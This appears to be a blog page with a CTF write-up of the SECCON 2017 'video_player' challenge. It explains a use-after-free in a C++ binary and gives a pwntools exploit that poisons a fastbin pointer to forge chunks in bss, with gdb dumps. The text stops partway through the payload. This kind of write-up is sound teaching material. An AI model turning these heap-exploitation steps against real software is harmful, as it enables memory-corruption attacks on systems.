@@ -1,0 +1,613 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="theme-color" content="#2ecc71">
+
+
+
+
+
+<title>SECCON 2017 Online CTF - video_player | kileak</title>
+
+
+
+
+
+<meta name="description" content="SECCON 2017 Online CTF - video_player">
+
+
+<meta name="keywords" content="seccon">
+
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+
+
+
+
+
+
+<link rel="canonical" href="https://kileak.github.io/ctf/2017/SECCON2017-video_player/">
+<link rel="alternate" type="application/rss+xml" title="kileak" href="https://kileak.github.io/feed.xml" />
+
+
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4PGFKKP0QW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-4PGFKKP0QW');
+</script>
+
+
+<script>base_url = "";</script>
+
+  </head>
+  <body class="">
+
+    <main class="main-container">
+
+        <header class="site-header">
+
+  <div class="container txt-center">
+    <a href="#" class="nav-toogle js-menu-trigger sliding-panel-button">
+      <span></span>
+      <span></span>
+      <span></span>
+    </a>
+
+    <nav class="js-menu sliding-panel-content">
+      <ul>
+        <li><a href="/">home</a></li>
+        <li><a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank">youtube</a></li>
+        <li><a href="/feed.xml" target="_blank"><i class="icon icon-feed"></i> feed</a></li>
+      </ul>
+    </nav>
+    <div class="js-menu-screen sliding-panel-fade-screen"></div>
+
+    <a href="/" class="author-thumb dot">
+      <img src="/images/author.jpg" alt="Author thumbnail" class="dot">
+    </a>
+
+    <!--
+    <a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank" class="youtube-thumb dot">
+      <img src="/images/youtube-icon.png" alt="Youtube" class "dot">
+    </a>
+    -->
+
+    
+      <h1 class="post-title">SECCON 2017 Online CTF - video_player</h1>
+      <p class="post-meta">Dec 9, 2017</p>
+    
+
+  </div>
+
+</header>
+
+
+        <section class="main-content">
+          <article class="post">
+
+  <div class="post-content container">
+    <blockquote>
+  <p>video_player (30 solves) (500 points)
+<!--break--></p>
+
+  <p>video_player
+Is my video player good enough??</p>
+
+  <p>Host : video_player.pwn.seccon.jp
+Port : 7777</p>
+
+  <p>Attachment: <a href="https://kileak.github.io/assets/videoplayer/video_player.zip">video_player.zip (pw: seccon2017)</a> <a href="https://kileak.github.io/assets/videoplayer/xpl.py">xpl.py</a></p>
+</blockquote>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">CANARY    : ENABLED
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : Partial</code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">Welcome to SVP ( SECCON Video Player ) !!!
+What is your movie name?
+AAAABBBB
+1. Add Clip
+2. Edit Clip
+3. Play Clip
+4. Remove Clip
+&gt;&gt;&gt; </code></pre></figure>
+
+<p>The binary lets us create different clips (video, audio, subtitles, metadata), edit them and play (video and audio only).</p>
+
+<p>Playing a clip is basically just printing it to the screen <code class="language-plaintext highlighter-rouge">xor</code>ed with a constant byte, so this might become useful for leaking data.</p>
+
+<p>While reversing the binary, you’ll quickly stumble over a “heap initialization” method, which looks a bit scary at first.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">randomize_heap</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">void</span> <span class="o">*</span><span class="n">chunk_table</span><span class="p">[</span><span class="mi">513</span><span class="p">];</span>   
+  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">seed_value</span><span class="p">;</span> 
+  <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
+
+  <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/dev/urandom"</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
+    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+
+  <span class="k">if</span> <span class="p">(</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">seed_value</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">4</span> <span class="p">)</span>
+    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+
+  <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+
+  <span class="n">srand</span><span class="p">(</span><span class="n">seed_value</span><span class="p">);</span>
+
+  <span class="c1">// Create randomly sized chunks on the heap</span>
+  <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">255</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+    <span class="n">chunk_table</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">operator</span> <span class="n">new</span><span class="p">[](</span><span class="n">rand</span><span class="p">());</span>
+  
+  <span class="c1">// Remove random chunks from the heap</span>
+  <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">255</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="n">rand</span><span class="p">()</span> <span class="o">%</span> <span class="mi">3</span> <span class="o">==</span> <span class="mi">0</span> <span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span> <span class="n">chunk_table</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="p">)</span> <span class="p">)</span>
+        <span class="n">operator</span> <span class="n">delete</span><span class="p">[](</span><span class="n">chunk_table</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+
+    <span class="n">chunk_table</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+  <span class="p">}</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>When this bummer is through, the heap will be quite cluttered. This will render any heap leaks useless, since even if we knew an address on the heap, there’s no way to conclude any other chunk addresses from this, since there will be many random gaps between the chunks.</p>
+
+<p>On the other side, it indicates, that we won’t need to care about finding heap leaks at all, so this also has a bright side :).</p>
+
+<p>Since it’s a C++ binary, there are a lot of structs and virtual functions to reverse, so reversing the complete binary was a little bit time consuming. And in the end, it turned out, that the <code class="language-plaintext highlighter-rouge">VideoClip</code> class is all we need, to pwn this binary.</p>
+
+<p>The clip base class and the video clip class should look like this:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">class</span> <span class="n">Clip</span> <span class="p">{</span>
+<span class="nl">public:</span>
+    <span class="n">Clip</span><span class="p">()</span> <span class="p">{}</span>
+
+    <span class="k">virtual</span> <span class="kt">void</span> <span class="n">Edit</span><span class="p">()</span> <span class="p">{}</span>
+    <span class="k">virtual</span> <span class="kt">void</span> <span class="n">Delete</span><span class="p">()</span> <span class="p">{}</span>
+    <span class="k">virtual</span> <span class="kt">void</span> <span class="n">Play</span><span class="p">()</span> <span class="p">{}</span>
+<span class="p">};</span>
+
+<span class="n">class</span> <span class="n">VideoClip</span> <span class="o">:</span> <span class="n">Clip</span> <span class="p">{</span>
+<span class="nl">private:</span>
+    <span class="kt">long</span> <span class="n">Resolution</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">FPS</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">Length</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">Data</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">Description</span><span class="p">[</span><span class="mi">48</span><span class="p">];</span>
+
+<span class="nl">public:</span>
+    <span class="n">VideoClip</span><span class="p">()</span> <span class="o">:</span> <span class="n">Clip</span><span class="p">()</span> <span class="p">{</span> <span class="p">...</span> <span class="p">}</span>
+
+    <span class="kt">void</span> <span class="n">Edit</span><span class="p">()</span> <span class="p">{</span> <span class="p">...</span> <span class="p">}</span>
+    <span class="kt">void</span> <span class="n">Delete</span><span class="p">()</span> <span class="p">{</span> <span class="p">...</span> <span class="p">}</span>
+    <span class="kt">void</span> <span class="n">Play</span><span class="p">()</span> <span class="p">{</span> <span class="p">...</span> <span class="p">}</span>
+<span class="p">};</span>
+
+<span class="n">class</span> <span class="n">AudioClip</span> <span class="o">:</span> <span class="n">Clip</span> <span class="p">{</span>
+<span class="nl">private:</span>
+    <span class="kt">short</span> <span class="n">Bitrate</span><span class="p">;</span>
+    <span class="kt">short</span> <span class="n">Length</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">Data</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">Description</span><span class="p">[</span><span class="mi">48</span><span class="p">];</span>
+<span class="nl">public:</span>
+    <span class="n">AudioClip</span><span class="p">()</span> <span class="o">:</span> <span class="n">Clip</span><span class="p">()</span> <span class="p">{</span> <span class="p">...</span> <span class="p">}</span>
+
+    <span class="kt">void</span> <span class="n">Edit</span><span class="p">()</span> <span class="p">{</span> <span class="p">...</span> <span class="p">}</span>
+    <span class="kt">void</span> <span class="n">Delete</span><span class="p">()</span> <span class="p">{</span> <span class="p">...</span> <span class="p">}</span>
+    <span class="kt">void</span> <span class="n">Play</span><span class="p">()</span> <span class="p">{</span> <span class="p">...</span> <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="n">class</span> <span class="n">SubtitleClip</span> <span class="o">:</span> <span class="n">Clip</span> <span class="p">{</span>
+  <span class="p">...</span>
+<span class="p">}</span>
+
+<span class="n">class</span> <span class="n">MetadataClip</span> <span class="o">:</span> <span class="n">Clip</span> <span class="p">{</span>
+  <span class="p">...</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>When going through the code, most of the virtual functions for the different clips look quite similar, but there’s one small discrepancy in the <code class="language-plaintext highlighter-rouge">Edit</code> method for the video clip.</p>
+
+<p><code class="language-plaintext highlighter-rouge">Edit</code> method of AudioClip (skipped the <code class="language-plaintext highlighter-rouge">exit</code> calls for better readability):</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">bool</span> <span class="n">AudioClip</span><span class="o">::</span><span class="n">Edit</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">char</span><span class="o">*</span> <span class="n">ptrData</span><span class="p">;</span> 
+  
+  <span class="n">cout</span><span class="o">&lt;&lt;</span><span class="s">"Audio Bitrate : "</span><span class="p">;</span>
+  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">Bitrate</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
+
+  <span class="n">cout</span><span class="o">&lt;&lt;</span><span class="s">"Audio Length (seconds) : "</span><span class="p">);</span>  
+  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">Length</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
+    
+  <span class="k">if</span> <span class="p">(</span><span class="n">Length</span> <span class="o">&gt;</span> <span class="mi">256</span><span class="p">)</span>
+    <span class="n">Length</span> <span class="o">=</span> <span class="mi">256</span><span class="p">;</span>
+
+  <span class="c1">// Allocate memory for the clip data</span>
+  <span class="n">ptrData</span> <span class="o">=</span> <span class="n">new</span> <span class="kt">char</span><span class="p">[</span><span class="n">Length</span><span class="p">];</span>
+  
+  <span class="c1">// If the clip already contains data, free it</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">Data</span><span class="p">)</span>
+    <span class="n">delete</span><span class="p">[](</span><span class="n">Data</span><span class="p">);</span>
+
+  <span class="c1">// Assign new allocated memory to data ptr</span>
+  <span class="n">Data</span> <span class="o">=</span> <span class="n">ptrData</span><span class="p">;</span>
+
+  <span class="n">cout</span><span class="o">&lt;&lt;</span><span class="s">"Audio Data : "</span><span class="p">;</span>  
+  <span class="n">Length</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">Data</span><span class="p">,</span> <span class="n">Length</span><span class="p">);</span>
+  
+  <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">Description</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">48</span><span class="p">);</span>  
+  <span class="n">cout</span><span class="o">&lt;&lt;</span><span class="s">"Edit description : "</span><span class="p">;</span>
+  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">Description</span><span class="p">,</span> <span class="mi">47</span><span class="p">);</span>
+
+  <span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>So, everything is looking fine. The function allocates some memory, frees the possible already existing data pointer, and then reads in the data for this clip.</p>
+
+<p>Now, let’s take a look at the <code class="language-plaintext highlighter-rouge">Edit</code> method for video clips:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">bool</span> <span class="n">VideoClip</span><span class="o">::</span><span class="n">Edit</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">char</span><span class="o">*</span> <span class="n">ptrData</span><span class="p">;</span> 
+  
+  <span class="n">cout</span><span class="o">&lt;&lt;</span><span class="s">"Video Resolution : "</span><span class="p">;</span>
+  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">Resolution</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
+
+  <span class="n">cout</span><span class="o">&lt;&lt;</span><span class="s">"FPS : "</span><span class="p">;</span>
+  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">FPS</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
+
+  <span class="n">cout</span><span class="o">&lt;&lt;</span><span class="s">"Number of Frames : "</span><span class="p">;</span>  
+  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">Length</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
+    
+  <span class="k">if</span> <span class="p">(</span><span class="n">Length</span> <span class="o">&gt;</span> <span class="mi">1024</span><span class="p">)</span>
+    <span class="n">Length</span> <span class="o">=</span> <span class="mi">1024</span><span class="p">;</span>
+
+  <span class="c1">// Allocate memory for the clip data</span>
+  <span class="n">ptrData</span> <span class="o">=</span> <span class="n">new</span> <span class="kt">char</span><span class="p">[</span><span class="n">Length</span><span class="p">];</span>
+  
+  <span class="c1">// Assign new allocated memory to data ptr</span>
+  <span class="n">Data</span> <span class="o">=</span> <span class="n">ptrData</span><span class="p">;</span>
+
+  <span class="c1">// Wait... what???</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">Data</span><span class="p">)</span>
+    <span class="n">delete</span><span class="p">[](</span><span class="n">Data</span><span class="p">);</span>         
+    
+  <span class="n">cout</span><span class="o">&lt;&lt;</span><span class="s">"Video Data : "</span><span class="p">;</span>  
+  <span class="n">Length</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">Data</span><span class="p">,</span> <span class="n">Length</span><span class="p">);</span>
+
+  <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">Description</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">);</span>
+
+  <span class="n">cout</span><span class="o">&lt;&lt;</span><span class="s">"Edit description : "</span><span class="p">;</span>  
+  <span class="k">if</span> <span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">Description</span><span class="p">,</span> <span class="mi">47</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span>
+    <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
+
+  <span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>The <code class="language-plaintext highlighter-rouge">edit</code> function of <code class="language-plaintext highlighter-rouge">VideoClip</code> also allocates memory for its content and uses the same method as <code class="language-plaintext highlighter-rouge">AudioClip</code> but the order of the 3 steps (Allocate, free existing, assign new chunk) is mixed up.</p>
+
+<p>Thus, it allocates a new chunk for the video data, assigns it to <code class="language-plaintext highlighter-rouge">clip-&gt;Data</code> and AFTER that, it frees <code class="language-plaintext highlighter-rouge">clip-&gt;Data</code>, which is now containing a dangling pointer to the freed memory chunk. Use-After-Free, all we need to get to our flag :)</p>
+
+<p>So first, we’ll have to create a video clip and edit it afterwards. The creation of the clips is a bit awkward, since it doesn’t read the values as numbers, which get converted with <code class="language-plaintext highlighter-rouge">atoi</code>, but reads them directly into the class members instead. So we have to specify them as packed values.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/python
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="n">LOCAL</span> <span class="o">=</span> <span class="bp">True</span>
+
+<span class="n">HOST</span> <span class="o">=</span> <span class="s">"video_player.pwn.seccon.jp"</span>
+<span class="n">PORT</span> <span class="o">=</span> <span class="mi">7777</span>
+
+<span class="k">def</span> <span class="nf">add_video_clip</span><span class="p">(</span><span class="n">res</span><span class="p">,</span> <span class="n">fps</span><span class="p">,</span> <span class="n">num</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">desc</span><span class="p">):</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;&gt;&gt; "</span><span class="p">,</span> <span class="s">"1"</span><span class="p">)</span>    
+    <span class="n">r</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">res</span><span class="p">))</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="n">p32</span><span class="p">(</span><span class="n">fps</span><span class="p">))</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="n">p32</span><span class="p">(</span><span class="n">num</span><span class="p">))</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="n">desc</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt;&gt;&gt; "</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">edit_video_clip</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">res</span><span class="p">,</span> <span class="n">fps</span><span class="p">,</span> <span class="n">num</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">desc</span><span class="p">):</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"2"</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Enter index : "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span> 
+    <span class="n">r</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">res</span><span class="p">))</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="n">p32</span><span class="p">(</span><span class="n">fps</span><span class="p">))</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="n">p32</span><span class="p">(</span><span class="n">num</span><span class="p">))</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="n">desc</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt;&gt;&gt; "</span><span class="p">)</span> 
+
+<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="mi">100</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt;&gt;&gt; "</span><span class="p">)</span>
+
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Create initial video (data =&gt; fastbin size)"</span><span class="p">)</span>
+    <span class="n">add_video_clip</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span> <span class="mi">20</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="s">"C"</span><span class="o">*</span><span class="mi">100</span><span class="p">,</span> <span class="s">"B"</span><span class="o">*</span><span class="mi">16</span><span class="p">)</span>
+
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Edit video for UAF (overwrite fastbin FD"</span><span class="p">)</span>
+    <span class="n">edit_video_clip</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="mi">20</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x6043e5</span><span class="p">),</span> <span class="s">"B"</span><span class="o">*</span><span class="mi">16</span><span class="p">)</span>
+
+    <span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+    
+    <span class="k">return</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
+        <span class="n">LOCAL</span> <span class="o">=</span> <span class="bp">False</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
+        <span class="n">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">LOCAL</span> <span class="o">=</span> <span class="bp">False</span>
+
+        <span class="k">if</span> <span class="n">LOCAL</span><span class="p">:</span>
+            <span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./video_player"</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./video_player"</span><span class="p">,</span> <span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s">"LD_PRELOAD"</span> <span class="p">:</span> <span class="s">"./libc.so.6"</span><span class="p">})</span>
+        
+        <span class="k">print</span> <span class="n">util</span><span class="p">.</span><span class="n">proc</span><span class="p">.</span><span class="n">pidof</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
+        <span class="n">pause</span><span class="p">()</span>
+        <span class="n">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">)</span></code></pre></figure>
+
+<p>In <code class="language-plaintext highlighter-rouge">Edit</code>, the binary will allocate a chunk for holding our data, freeing it directly afterwards (thus putting it into the fastbin list) and then read our input into this chunk (effectively overwriting the FD pointer of the freed fastbin chunk).</p>
+
+<p>When we now allocate another fastbin with the same size, it will put our fake <code class="language-plaintext highlighter-rouge">FD</code> pointer into the fastbin list, so we can control where <code class="language-plaintext highlighter-rouge">malloc</code> allocates the next chunk (of this size). We only need something, that looks like a fastbin.</p>
+
+<p>We’ll be using the misalignment trick (often used for overwriting <code class="language-plaintext highlighter-rouge">malloc_hook</code>), to get a chunk overlapping the <code class="language-plaintext highlighter-rouge">clip array</code>.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">gdb-peda$ x/10gx $cliptable-0x20
+0x6043e0 &lt;vtable for __cxxabiv1::__si_class_type_info+80&gt;:  0x00007ffff7720760  0x00007ffff7dd4620
+0x6043f0: 0x0000000000000000  0x0000000000000000
+0x604400: 0x000000000063e8a0  0x0000000000000000
+0x604410: 0x0000000000000000  0x0000000000000000
+0x604420: 0x0000000000000000  0x0000000000000000</code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">gdb-peda$ x/10gx $cliptable-0x20+5
+0x6043e5 &lt;vtable for __cxxabiv1::__si_class_type_info+85&gt;:  0xfff7dd462000007f  0x000000000000007f  &lt;== Fake chunksize (fastbin)
+0x6043f5: 0x0000000000000000  0x000063e8a0000000  
+0x604405: 0x0000000000000000  0x0000000000000000
+0x604415: 0x0000000000000000  0x0000000000000000
+0x604425: 0x0000000000000000  0x0000000000000000</code></pre></figure>
+
+<p>By using <code class="language-plaintext highlighter-rouge">0x6043e5</code> as fake <code class="language-plaintext highlighter-rouge">FD</code> pointer, we can trick malloc into recognizing this as a valid fastbin chunk and serving it as the data pointer for our next video clip.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Add video to get fake fastbin FD to fastbin list"</span><span class="p">)</span>  
+<span class="n">add_video_clip</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span> <span class="mi">20</span><span class="p">,</span> <span class="mi">104</span><span class="p">,</span> <span class="s">"C"</span><span class="o">*</span><span class="mi">104</span><span class="p">,</span> <span class="s">"B"</span><span class="o">*</span><span class="mi">16</span><span class="p">)</span></code></pre></figure>
+
+<p>We’ll now just create a dummy video clip. This will allocate the freed chunk from our previous video, putting our fake <code class="language-plaintext highlighter-rouge">FD</code> pointer into the fastbin list. The next video will then overwrite the area of <code class="language-plaintext highlighter-rouge">clip array</code>.</p>
+
+<p>Since we don’t know any heap addresses, we can use this overwrite to migrate all data to the <code class="language-plaintext highlighter-rouge">bss</code> section, creating fake chunks there and point the <code class="language-plaintext highlighter-rouge">clip array</code> to our fake chunks. Thus, we don’t need to worry about the heap and its randomization anymore.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Add video to overwrite fastbin content (bss)"</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="o">*</span><span class="mi">11</span>
+
+<span class="c1"># Clip table
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x604420</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>                  <span class="c1"># Pointer to fake video chunk
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>      <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
+
+<span class="c1"># Fake video chunk
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x402968</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000064</span><span class="p">)</span>   <span class="c1"># VTable + Resolution
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x00000014</span><span class="p">)</span>                           <span class="c1"># FPS
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x00000006</span><span class="p">)</span>                           <span class="c1"># Length
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">"rand"</span><span class="p">])</span>                        <span class="c1"># Data Ptr
+</span>
+<span class="n">add_video_clip</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span> <span class="mi">20</span><span class="p">,</span> <span class="mi">104</span><span class="p">,</span> <span class="n">payload</span> <span class="p">,</span> <span class="s">"B"</span><span class="o">*</span><span class="mi">16</span><span class="p">)</span></code></pre></figure>
+
